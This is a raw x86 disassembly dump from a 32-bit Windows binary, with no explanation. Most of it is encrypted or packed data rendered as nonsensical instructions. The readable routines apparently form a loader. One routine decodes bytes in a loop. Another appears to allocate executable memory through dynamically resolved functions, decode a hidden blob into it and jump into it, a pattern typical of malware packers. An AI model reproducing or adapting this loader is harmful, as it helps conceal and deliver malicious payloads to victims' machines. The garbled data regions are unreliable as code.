  421432:	(bad)  
  421433:	pop    eax
  421434:	les    esp,FWORD PTR [ecx]
  421436:	mov    ch,0xfe
  421438:	(bad)  
  421439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42143a:	sub    BYTE PTR [edi],0x21
  42143d:	dec    edi
  42143e:	fidivr WORD PTR [edi]
  421440:	stos   DWORD PTR es:[edi],eax
  421441:	loopne 0x4213fb
  421443:	mov    ?,WORD PTR [ecx]
  421445:	je     0x4213fa
  421447:	push   ecx
  421448:	popf   
  421449:	mov    esi,0x15edec9e
  42144e:	popf   
  42144f:	push   esp
  421450:	or     eax,0x50d6a75b
  421455:	pop    ss
  421456:	lahf   
  421457:	xchg   DWORD PTR [ebx],eax
  421459:	out    dx,eax
  42145a:	daa    
  42145b:	test   DWORD PTR [edi+0x17eb2c9],0xfa3f9a69
  421465:	sahf   
  421466:	popf   
  421467:	mov    esi,0x888b9fec
  42146c:	inc    ebx
  42146d:	xor    BYTE PTR [edi-0xe],dl
  421470:	fsub   QWORD PTR [ebp+0x4b]
  421473:	stos   BYTE PTR es:[edi],al
  421474:	cmp    BYTE PTR ss:[edx+ecx*8+0x3d],0x1e
  42147a:	add    eax,0x1b73f37b
  42147f:	sbb    al,0x78
  421481:	lds    ebx,FWORD PTR [edi-0xca1b339]
  421487:	inc    eax
  421488:	fsub   QWORD PTR [ecx+0x446eb21c]
  42148e:	push   ss
  42148f:	cli    
  421490:	int    0x9
  421492:	icebp  
  421493:	(bad)  
  421494:	mov    ebx,0xad219e23
  421499:	gs in  eax,dx
  42149b:	push   0x51db4ac7
  4214a0:	and    dl,dh
  4214a2:	out    dx,al
  4214a3:	push   es
  4214a4:	mov    edi,0xaa7359ae
  4214a9:	or     DWORD PTR [edi-0x698af27f],eax
  4214af:	sbb    eax,0x34487163
  4214b4:	or     dl,ch
  4214b6:	mov    ?,ebp
  4214b8:	enter  0x6672,0x30
  4214bc:	dec    ecx
  4214bd:	fstp   TBYTE PTR [eax-0x1a87488]
  4214c3:	cmp    DWORD PTR [edi-0x45],0x64
  4214c7:	mov    edi,0xc3c033b3
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428100
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428104
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428108
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42810c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f0
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280f4
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x4280f8
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x4280fc
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x4280fe
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	cmp    DWORD PTR [ebp+0x8],0x0
  421630:	jne    0x42163b
  421632:	mov    eax,DWORD PTR [ebp-0x10]
  421635:	add    eax,0x1
  421638:	mov    DWORD PTR [ebp-0x10],eax
  42163b:	mov    DWORD PTR [ebp-0x48],0x0
  421642:	mov    DWORD PTR [ebp-0x4c],0x0
  421649:	push   0x1
  42164b:	lea    ecx,[ebp-0x14]
  42164e:	push   ecx
  42164f:	call   DWORD PTR ds:0x428000
  421655:	mov    BYTE PTR [ebp-0x40],0x56
  421659:	call   DWORD PTR ds:0x428010
  42165f:	mov    DWORD PTR [ebp-0x2c],eax
  421662:	mov    BYTE PTR [ebp-0x3e],0x72
  421666:	movzx  edx,WORD PTR [ebp-0x2c]
  42166a:	test   edx,edx
  42166c:	jne    0x4216ae
  42166e:	mov    BYTE PTR [ebp-0x34],0x0
  421672:	mov    DWORD PTR [ebp-0x14],0xe0d
  421679:	lea    eax,[ebp-0x28]
  42167c:	push   eax
  42167d:	call   DWORD PTR ds:0x428014
  421683:	mov    DWORD PTR [ebp-0x68],eax
  421686:	mov    DWORD PTR [ebp-0x5c],0x3a
  42168d:	lea    ecx,[ebp-0x40]
  421690:	push   ecx
  421691:	mov    edx,DWORD PTR [ebp-0x68]
  421694:	push   edx
  421695:	call   DWORD PTR ds:0x428018
  42169b:	mov    DWORD PTR [ebp-0x44],eax
  42169e:	mov    DWORD PTR [ebp-0x8],0x59f0f0e5
  4216a5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ac:	jmp    0x4216c3
  4216ae:	mov    BYTE PTR ds:0x443a58,0x0
  4216b5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216bc:	mov    BYTE PTR ds:0x441b18,0x0
  4216c3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216ca:	push   DWORD PTR ds:0x428014
  4216d0:	pop    edx
  4216d1:	mov    DWORD PTR [ebp-0x74],edx
  4216d4:	push   DWORD PTR [ebp-0x30]
  4216d7:	push   0x1000
  4216dc:	mov    eax,DWORD PTR [ebp-0x14]
  4216df:	add    eax,0x23
  4216e2:	add    eax,0x23
  4216e5:	push   eax
  4216e6:	xor    eax,eax
  4216e8:	push   eax
  4216e9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216ec:	call   ecx
  4216ee:	mov    edx,eax
  4216f0:	mov    DWORD PTR [ebp-0x4],edx
  4216f3:	mov    eax,DWORD PTR [ebp-0x70]
  4216f6:	sub    eax,0xdae0b
  4216fb:	mov    DWORD PTR [ebp-0x70],eax
  4216fe:	cmp    DWORD PTR [ebp-0x4],0x0
  421702:	jne    0x42170b
  421704:	mov    BYTE PTR ds:0x441b18,0x0
  42170b:	mov    ecx,DWORD PTR [ebp-0x4]
  42170e:	add    ecx,DWORD PTR [ebp-0x14]
  421711:	mov    edx,DWORD PTR [ebp-0x8]
  421714:	mov    DWORD PTR [ecx],edx
  421716:	mov    eax,DWORD PTR [ebp-0x4]
  421719:	add    eax,DWORD PTR [ebp-0x5c]
  42171c:	mov    DWORD PTR [ebp-0x64],eax
  42171f:	mov    ecx,DWORD PTR ds:0x428018
  421725:	mov    DWORD PTR [ebp-0x54],ecx
  421728:	mov    edx,DWORD PTR [ebp-0x4]
  42172b:	add    edx,DWORD PTR [ebp-0x14]
  42172e:	mov    eax,DWORD PTR [ebp+0x8]
  421731:	mov    DWORD PTR [edx+0x4],eax
  421734:	mov    ecx,DWORD PTR [ebp-0x4]
  421737:	add    ecx,DWORD PTR [ebp-0x14]
  42173a:	mov    DWORD PTR [ebp-0xc],ecx
  42173d:	cmp    DWORD PTR [ebp-0x70],0x0
  421741:	jbe    0x42175e
  421743:	mov    edx,DWORD PTR [ebp-0xc]
  421746:	push   edx
  421747:	mov    eax,DWORD PTR [ebp-0x14]
  42174a:	push   eax
  42174b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42174e:	add    ecx,DWORD PTR [ebp-0x70]
  421751:	push   ecx
  421752:	mov    edx,DWORD PTR [ebp-0x4]
  421755:	push   edx
  421756:	call   0x4214d0
  42175b:	add    esp,0x10
  42175e:	cmp    DWORD PTR [ebp-0x64],0x0
  421762:	je     0x421776
  421764:	mov    ecx,DWORD PTR [ebp-0x54]
  421767:	push   ecx
  421768:	push   DWORD PTR [ebp-0x74]
  42176b:	mov    esi,DWORD PTR [ebp-0x64]
  42176e:	push   edx
  42176f:	pop    eax
  421770:	push   ecx
  421771:	nop
  421772:	jmp    esi
  421774:	jmp    0x42177c
  421776:	mov    eax,DWORD PTR [ebp+0x8]
  421779:	mov    DWORD PTR [ebp-0x18],eax
  42177c:	mov    eax,0x1
  421781:	pop    esi
  421782:	mov    esp,ebp
  421784:	pop    ebp
  421785:	ret    
  421786:	int3   
  421787:	int3   
  421788:	int3   
  421789:	int3   
  42178a:	int3   
  42178b:	int3   
  42178c:	int3   
  42178d:	int3   
  42178e:	int3   
  42178f:	int3   
  421790:	push   ebp
  421791:	mov    ebp,esp
  421793:	sub    esp,0x18
  421796:	lea    eax,[ebp-0x18]
  421799:	push   eax
  42179a:	call   DWORD PTR ds:0x42800c
  4217a0:	cmp    WORD PTR [ebp-0x18],0x0
  4217a5:	je     0x4217e8
  4217a7:	mov    ecx,DWORD PTR ds:0x428010
  4217ad:	push   0x0
  4217af:	push   0xb2
  4217b4:	push   0x82
  4217b9:	push   0x0
  4217bb:	mov    DWORD PTR [ebp-0x4],ecx
  4217be:	call   DWORD PTR ds:0x428008
  4217c4:	push   DWORD PTR [ebp-0x4]
  4217c7:	pop    edx
  4217c8:	call   edx
  4217ca:	push   eax
  4217cb:	pop    DWORD PTR [ebp-0x8]
  4217ce:	push   0x55c2066e
  4217d3:	call   0x421550
  4217d8:	add    esp,0x4
  4217db:	call   0x411000
  4217e0:	xor    eax,eax
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    0x10
  4217e8:	push   DWORD PTR [esi]
  4217ea:	jmp    0x3677:0xf523b2
  4217f1:	mov    DWORD PTR [ebp-0x7b2884f3],ecx
  4217f7:	mov    al,0x22
  4217f9:	fwait
  4217fa:	test   BYTE PTR [eax],0x77
  4217fd:	lea    ecx,ss:[ebp+0x7b283b0d]
  421804:	mov    al,0x22
  421806:	and    esi,esi
  421808:	add    BYTE PTR [edi+0x36],dh
  42180b:	lea    ecx,[ebp+0x7b287b0d]
  421811:	mov    al,0x22
  421813:	and    esi,esi
  421815:	add    BYTE PTR [edi+0x36],dh
  421818:	lea    ecx,[ebp+0x7b287b0d]
  42181e:	mov    al,0x22
  421820:	and    esi,esi
  421822:	add    BYTE PTR [edi+0x36],dh
  421825:	jne    0x4217b4
  421827:	or     eax,0xa64267b
  42182c:	sub    al,0x23
  42182e:	inc    edx
  42182f:	or     DWORD PTR [edx+0x418c3517],edi
  421835:	mov    dh,0x9
  421837:	das    
  421838:	fmul   DWORD PTR [ebx+0x50]
  42183b:	(bad)  
  42183c:	jo     0x421843
  42183e:	pop    ecx
  42183f:	jmp    0xd118:0x8166cff
  421846:	dec    esp
  421847:	dec    ebp
  421848:	cdq    
  421849:	je     0x4218a2
  42184b:	push   esp
  42184c:	call   0x465097fe
  421851:	pop    ebx
  421852:	(bad)  [ebx+eax*1-0x4e]
  421856:	dec    edi
  421857:	and    al,0x16
  421859:	loopne 0x42183d
  42185b:	imul   ebx,DWORD PTR [esi],0x28bd7606
  421861:	pop    es
  421862:	test   BYTE PTR [eax],0x77
  421865:	lea    ecx,ss:[ebp-0x784e83f3]
  42186c:	jmp    0xaa6f3d2
  421871:	xor    al,0xce
  421873:	pop    ds
  421874:	xchg   DWORD PTR [esi-0x7d],ecx
  421877:	mov    edx,0x2f47e871
  42187c:	cld    
  42187d:	pop    edi
  42187e:	(bad)  
  42187f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421880:	xchg   ebp,edx
  421882:	push   0x48b92243
  421887:	mov    al,0x29
  421889:	scas   al,BYTE PTR es:[edi]
  42188a:	gs dec esi
  42188c:	cmp    al,0xe5
  42188e:	jne    0x42182f
  421890:	jno    0x421896
  421892:	cmc    
  421893:	mov    DWORD PTR [eax],ebp
  421895:	gs push cs
  421897:	xchg   edx,eax
  421898:	jge    0x421916
  42189a:	or     eax,0xd031079c
  42189f:	jmp    0xf7e5815e
  4218a4:	or     ch,BYTE PTR [edi]
  4218a6:	into   
  4218a7:	pop    ds
  4218a8:	xchg   DWORD PTR [esi-0x7d],ecx
  4218ab:	mov    ebx,0xb1db9871
  4218b0:	cld    
  4218b1:	mov    edi,0xc087b6af
  4218b6:	cmc    
  4218b7:	jmp    0x20173bde
  4218bc:	sub    esi,edi
  4218be:	clc    
  4218bf:	in     eax,0x3c
  4218c1:	aad    0xe8
  4218c3:	add    eax,0x22836a71
  4218c8:	sub    BYTE PTR [ebx-0x6d],bh
  4218cb:	(bad)  
  4218cd:	je     0x421944
  4218cf:	pop    ds
  4218d0:	pop    es
  4218d1:	sub    DWORD PTR [ecx+0x18],eax
  4218d4:	fsub   DWORD PTR [ecx-0x25]
  4218d7:	or     dh,BYTE PTR fs:[edi+0x36]
  4218db:	lea    ecx,[ebp+0x7b287b0d]
  4218e1:	loopne 0x42194a
  4218e3:	and    esi,esi
  4218e5:	dec    esp
  4218e6:	jbe    0x42191c
  4218e8:	lea    ebp,ds:0x7b6710dd
  4218ee:	mov    al,0x22
  4218f0:	and    esi,esi
  4218f2:	add    BYTE PTR [edi+0x36],dh
  4218f5:	ins    DWORD PTR es:[edi],dx
  4218f6:	lea    ecx,[esi]
  4218f8:	jp     0x42191d
  4218fa:	jp     0x4218b6
  4218fc:	and    ah,BYTE PTR [ebx]
  4218fe:	sbb    BYTE PTR [edi+esi*2],al
  421901:	xor    DWORD PTR ss:[ebx+0x7b287b0d],ecx
  421908:	mov    al,0x33
  42190a:	sahf   
  42190b:	test   BYTE PTR [eax],0x77
  42190e:	lea    ecx,es:[ebp+0x7b2d7b0d]
  421915:	mov    al,0x22
  421917:	(bad)  
  421918:	test   BYTE PTR [eax],0x67
  42191b:	lea    ecx,ss:[ebp+0x7e287b0f]
  421922:	mov    al,0x23
  421924:	and    esi,esi
  421926:	add    BYTE PTR [edi+0x36],dh
  421929:	mov    BYTE PTR [ebp+0x7b287b0c],cl
  42192f:	mov    al,0x22
  421931:	and    esp,DWORD PTR [esi-0x76c988f4]
  421937:	lea    ecx,ds:0xb07ecc7a
  42193d:	and    BYTE PTR [ebx],ah
  42193f:	test   BYTE PTR [eax-0x7262c989],0xd
  421946:	imul   ebp,DWORD PTR [eax],0x7b
  421949:	mov    al,0x22
  42194b:	xor    esi,esi
  42194d:	add    BYTE PTR [edi+0x36],ah
  421950:	lea    ecx,[ebp+0x6b287b0d]
  421956:	mov    al,0x22
  421958:	and    esi,esi
  42195a:	add    BYTE PTR [edi+0x36],dh
  42195d:	lea    ecx,[ebp+0x42dc7b0d]
  421963:	mov    esp,0xf54a22
  421968:	ja     0x4219a0
  42196a:	jge    0x4218f2
  42196c:	or     eax,0xb07b6134
  421971:	and    ah,BYTE PTR [ebx]
  421973:	test   BYTE PTR [eax],0x77
  421976:	lea    ecx,ss:[ebp+0x7b287b0d]
  42197d:	mov    al,0x22
  42197f:	and    esi,esi
  421981:	add    BYTE PTR [edi+0x36],dh
  421984:	lea    ecx,[ebp+0x7b287b0d]
  42198a:	mov    al,0x22
  42198c:	and    esi,esi
  42198e:	add    BYTE PTR [edi+0x36],dh
  421991:	lea    ecx,[ebp+0x7b287b0d]
  421997:	mov    al,0x22
  421999:	and    esi,esi
  42199b:	add    BYTE PTR [edi+0x36],dh
  42199e:	lea    ecx,[ebp+0x7b287b0d]
  4219a4:	mov    al,0x22
  4219a6:	and    esi,esi
  4219a8:	add    BYTE PTR [edi+0x36],dh
  4219ab:	lea    ecx,[ebp+0x7b287b0d]
  4219b1:	mov    al,0x22
  4219b3:	and    esi,esi
  4219b5:	add    BYTE PTR [edi+0x36],dh
  4219b8:	lea    ecx,[ebp+0x7b287b0d]
  4219be:	mov    al,0x22
  4219c0:	and    esi,esi
  4219c2:	add    BYTE PTR [edi+0x36],dh
  4219c5:	lea    ecx,[ebp+0x7b287b0d]
  4219cb:	mov    al,0x22
  4219cd:	and    esi,esi
  4219cf:	add    BYTE PTR [edi+0x36],dh
  4219d2:	lea    ecx,[ebp+0x7b287b0d]
  4219d8:	mov    al,0xc
  4219da:	push   edi
  4219db:	xchg   ebx,eax
  4219dc:	js     0x4219e1
  4219de:	lea    ecx,ss:[ebp+0x7b239b0d]
  4219e5:	mov    al,0x32
  4219e7:	and    esi,esi
  4219e9:	add    BYTE PTR [ebx+0x98d8d32],ah
  4219ef:	jnp    0x421a19
  4219f1:	sub    esi,ebp
  4219f3:	popa   
  4219f4:	adc    DWORD PTR [edx-0x72c988b1],esp
  4219fa:	lea    ecx,ds:0xb07b087b
  421a00:	ret    0x840d
  421a03:	jae    0x421a0a
  421a05:	push   ebp
  421a06:	lea    ecx,[ebp+0x7b487b0d]
  421a0c:	mov    al,0x22
  421a0e:	sar    ebp,cl
  421a10:	add    BYTE PTR [edi+0x6c],dh
  421a13:	lea    ecx,[ebp+0x7b2ca30d]
  421a19:	mov    al,0x22
  421a1b:	and    esi,esi
  421a1d:	add    BYTE PTR [edi+0x36],dh
  421a20:	lea    ecx,[ebp+0x5b287b0d]
  421a26:	mov    al,0x22
  421a28:	ret    
  421a29:	test   BYTE PTR [eax],0x77
  421a2c:	lea    ecx,ss:[ebp+0x7b287b0d]
  421a33:	mov    al,0x22
  421a35:	and    esi,esi
  421a37:	add    BYTE PTR [edi+0x36],dh
  421a3a:	lea    ecx,[ebp+0x7b287b0d]
  421a40:	mov    al,0x22
  421a42:	and    esi,esi
  421a44:	add    BYTE PTR [edi+0x36],dh
  421a47:	lea    ecx,[ebp+0x7b287b0d]
  421a4d:	mov    al,0x22
  421a4f:	and    esi,esi
  421a51:	add    BYTE PTR [edi+0x36],dh
  421a54:	lea    ecx,[ebp+0x7b287b0d]
  421a5a:	mov    al,0x22
  421a5c:	and    esi,esi
  421a5e:	add    BYTE PTR [edi+0x36],dh
  421a61:	lea    ecx,[ebp+0x7b287b0d]
  421a67:	mov    al,0x22
  421a69:	and    esi,esi
  421a6b:	add    BYTE PTR [edi+0x36],dh
  421a6e:	lea    ecx,[ebp+0x7b287b0d]
  421a74:	mov    al,0x22
  421a76:	and    esi,esi
  421a78:	add    BYTE PTR [edi+0x36],dh
  421a7b:	lea    ecx,[ebp+0x7b287b0d]
  421a81:	mov    al,0x22
  421a83:	and    esi,esi
  421a85:	add    BYTE PTR [edi+0x36],dh
  421a88:	lea    ecx,[ebp+0x7b287b0d]
  421a8e:	mov    al,0x22
  421a90:	and    esi,esi
  421a92:	add    BYTE PTR [edi+0x36],dh
  421a95:	lea    ecx,[ebp+0x7b287b0d]
  421a9b:	mov    al,0x22
  421a9d:	and    esi,esi
  421a9f:	add    BYTE PTR [edi+0x36],dh
  421aa2:	lea    ecx,[ebp+0x7b287b0d]
  421aa8:	mov    al,0x22
  421aaa:	and    esi,esi
  421aac:	add    BYTE PTR [edi+0x36],dh
  421aaf:	lea    ecx,[ebp+0x7b287b0d]
  421ab5:	mov    al,0x22
  421ab7:	and    esi,esi
  421ab9:	add    BYTE PTR [edi+0x36],dh
  421abc:	lea    ecx,[ebp+0x7b287b0d]
  421ac2:	mov    al,0x22
  421ac4:	and    esi,esi
  421ac6:	add    BYTE PTR [edi+0x36],dh
  421ac9:	lea    ecx,[ebp+0x7b287b0d]
  421acf:	mov    al,0x22
  421ad1:	and    esi,esi
  421ad3:	add    BYTE PTR [edi+0x36],dh
  421ad6:	lea    ecx,[ebp+0x7b287b0d]
  421adc:	mov    al,0x22
  421ade:	and    esi,esi
  421ae0:	add    BYTE PTR [edi+0x36],dh
  421ae3:	lea    ecx,[ebp+0x7b287b0d]
  421ae9:	mov    al,0x22
  421aeb:	and    esi,esi
  421aed:	add    BYTE PTR [edi+0x36],dh
  421af0:	lea    ecx,[ebp+0x7b287b0d]
  421af6:	mov    al,0x22
  421af8:	and    esi,esi
  421afa:	add    BYTE PTR [edi+0x36],dh
  421afd:	lea    ecx,[ebp+0x7b287b0d]
  421b03:	mov    al,0x22
  421b05:	and    esi,esi
  421b07:	add    BYTE PTR [edi+0x36],dh
  421b0a:	lea    ecx,[ebp+0x7b287b0d]
  421b10:	mov    al,0x22
  421b12:	and    esi,esi
  421b14:	add    BYTE PTR [edi+0x36],dh
  421b17:	lea    ecx,[ebp+0x7b287b0d]
  421b1d:	mov    al,0x22
  421b1f:	and    esi,esi
  421b21:	add    BYTE PTR [edi+0x36],dh
  421b24:	lea    ecx,[ebp+0x7b287b0d]
  421b2a:	mov    al,0x22
  421b2c:	and    esi,esi
  421b2e:	add    BYTE PTR [edi+0x36],dh
  421b31:	lea    ecx,[ebp+0x7b287b0d]
  421b37:	mov    al,0x22
  421b39:	and    esi,esi
  421b3b:	add    BYTE PTR [edi+0x36],dh
  421b3e:	lea    ecx,[ebp+0x7b287b0d]
  421b44:	mov    al,0x22
  421b46:	and    esi,esi
  421b48:	add    BYTE PTR [edi+0x36],dh
  421b4b:	lea    ecx,[ebp+0x7b287b0d]
  421b51:	mov    al,0x22
  421b53:	and    esi,esi
  421b55:	add    BYTE PTR [edi+0x36],dh
  421b58:	lea    ecx,[ebp+0x7b287b0d]
  421b5e:	mov    al,0x22
  421b60:	and    esi,esi
  421b62:	add    BYTE PTR [edi+0x36],dh
  421b65:	lea    ecx,[ebp+0x7b287b0d]
  421b6b:	mov    al,0x22
  421b6d:	and    esi,esi
  421b6f:	add    BYTE PTR [edi+0x36],dh
  421b72:	lea    ecx,[ebp+0x7b287b0d]
  421b78:	mov    al,0x22
  421b7a:	and    esi,esi
  421b7c:	add    BYTE PTR [edi+0x36],dh
  421b7f:	lea    ecx,[ebp+0x7b287b0d]
  421b85:	mov    al,0x22
  421b87:	and    esi,esi
  421b89:	add    BYTE PTR [edi+0x36],dh
  421b8c:	lea    ecx,[ebp+0x7b287b0d]
  421b92:	mov    al,0x22
  421b94:	and    esi,esi
  421b96:	add    BYTE PTR [edi+0x36],dh
  421b99:	lea    ecx,[ebp+0x7b287b0d]
  421b9f:	mov    al,0x22
  421ba1:	and    esi,esi
  421ba3:	add    BYTE PTR [edi+0x36],dh
  421ba6:	lea    ecx,[ebp+0x7b287b0d]
  421bac:	mov    al,0x22
  421bae:	and    esi,esi
  421bb0:	add    BYTE PTR [edi+0x36],dh
  421bb3:	lea    ecx,[ebp+0x7b287b0d]
  421bb9:	mov    al,0x22
  421bbb:	and    esi,esi
  421bbd:	add    BYTE PTR [edi+0x36],dh
  421bc0:	lea    ecx,[ebp+0x7b287b0d]
  421bc6:	mov    al,0x22
  421bc8:	and    esi,esi
  421bca:	add    BYTE PTR [edi+0x36],dh
  421bcd:	lea    ecx,[ebp+0x7b287b0d]
  421bd3:	mov    al,0x22
  421bd5:	and    esi,esi
  421bd7:	add    BYTE PTR [edi+0x36],dh
  421bda:	lea    ecx,[ebp+0x7b287b0d]
  421be0:	mov    al,0x22
  421be2:	and    esi,esi
  421be4:	add    BYTE PTR [edi+0x36],dh
  421be7:	lea    ecx,[ebp+0x7b23d362]
  421bed:	lahf   
  421bee:	and    ah,BYTE PTR [ebx]
  421bf0:	out    0x0,al
  421bf2:	ja     0x421c10
  421bf4:	das    
  421bf5:	push   edi
  421bf6:	jl     0x421c15
  421bf8:	xlat   BYTE PTR ds:[ebx]
  421bf9:	push   esi
  421bfa:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  421bfc:	jae    0x421c19
  421bfe:	ss lahf 
  421c00:	and    eax,0xa6b1839
  421c05:	lods   al,BYTE PTR ds:[esi]
  421c06:	and    DWORD PTR [ebx+0x6de09493],esp
  421c0c:	xchg   ebx,eax
  421c0d:	mov    esp,0x19234b0c
  421c12:	mov    eax,0x6c118944
  421c17:	inc    edi
  421c18:	pop    ss
  421c19:	push   ebp
  421c1a:	ss stos BYTE PTR es:[edi],al
  421c1c:	sub    al,BYTE PTR [ebp+0x1916792e]
  421c22:	adc    BYTE PTR [esi],bl
  421c24:	sub    edx,DWORD PTR [esi+eax*8]
  421c27:	push   esi
  421c28:	adc    BYTE PTR [ebx+0x29],0xc0
  421c2c:	fs test al,0x75
  421c2f:	or     eax,0x980a68db
  421c34:	push   edx
  421c35:	lods   eax,DWORD PTR ds:[esi]
  421c36:	add    cl,BYTE PTR cs:[edx+0x5af55682]
  421c3d:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  421c3f:	inc    ebx
  421c40:	mov    ecx,0x70a4cb87
  421c45:	out    0xa9,al
  421c47:	and    DWORD PTR [edx+0x25],edx
  421c4a:	xchg   edi,eax
  421c4b:	je     0x421c80
  421c4d:	sbb    al,0xd2
  421c4f:	lods   al,BYTE PTR ds:[esi]
  421c50:	jge    0x421cbe
  421c52:	lock dec eax
  421c54:	frstor [esi+ecx*1+0x3c285dc4]
  421c5b:	shl    DWORD PTR [edx-0x65dbe9d3],1
  421c61:	shl    esi,0x9e
  421c64:	pop    eax
  421c65:	fild   WORD PTR [edx+0x59]
  421c68:	leave  
  421c69:	mov    esp,0x27ccc1bc
  421c6e:	adc    eax,0xdb9e7c12
  421c73:	or     dh,BYTE PTR [edx]
  421c75:	repnz sbb ah,al
  421c78:	or     BYTE PTR [eax+0x4c],0x68
  421c7c:	les    esp,FWORD PTR [ebp-0xea34bf5]
  421c82:	mov    esp,DWORD PTR [eax+0x79f7077f]
  421c88:	arpl   WORD PTR [ebx],ax
  421c8a:	and    al,0x8c
  421c8c:	mov    esp,0xcdbf6df0
  421c91:	ret    0x5715
  421c94:	sahf   
  421c95:	xchg   ecx,eax
  421c96:	or     BYTE PTR [eax+0xf],bl
  421c99:	pusha  
  421c9a:	icebp  
  421c9b:	clc    
  421c9c:	pop    esp
  421c9d:	mov    ebp,0x5d7c2798
  421ca2:	adc    BYTE PTR [edx-0x6e],al
  421ca5:	sbb    eax,0xcabcc364
  421caa:	test   BYTE PTR [ebx-0x300a4671],dl
  421cb0:	xchg   ebx,eax
  421cb1:	int    0x8c
  421cb3:	sub    ecx,edx
  421cb5:	clc    
  421cb6:	push   ds
  421cb7:	fild   DWORD PTR [ebx-0x2f]
  421cba:	out    dx,eax
  421cbb:	aas    
  421cbc:	add    DWORD PTR [ebp-0xb4ed22c],ecx
  421cc2:	xlat   BYTE PTR ds:[ebx]
  421cc3:	and    eax,0xecb02006
  421cc8:	mov    al,ds:0xd4caed78
  421ccd:	mov    ss,WORD PTR [edx]
  421ccf:	cmp    esp,DWORD PTR [ebx+ebp*2]
  421cd2:	jae    0x421cb6
  421cd4:	sub    ebx,eax
  421cd6:	repz ror ecx,0x32
  421cda:	add    bl,ah
  421cdc:	xchg   esi,eax
  421cdd:	push   ss
  421cde:	out    dx,eax
  421cdf:	push   ecx
  421ce0:	adc    al,0x5f
  421ce2:	push   ebp
  421ce3:	xor    DWORD PTR [ecx+0x1e],ebx
  421ce6:	mov    al,ds:0x65443b2e
  421ceb:	or     esp,ecx
  421ced:	fimul  DWORD PTR [esp+ecx*4+0x3d8836cf]
  421cf4:	mov    ebp,0x4d77e9c9
  421cf9:	stos   DWORD PTR es:[edi],eax
  421cfa:	ret    
  421cfb:	fcomp  QWORD PTR [ecx+0x7986ced8]
  421d01:	data16 cld 
  421d03:	js     0x421d2f
  421d05:	mov    ?,WORD PTR ds:[ecx]
  421d08:	loop   0x421d5e
  421d0a:	test   DWORD PTR ss:[ebx+0x1e012223],edi
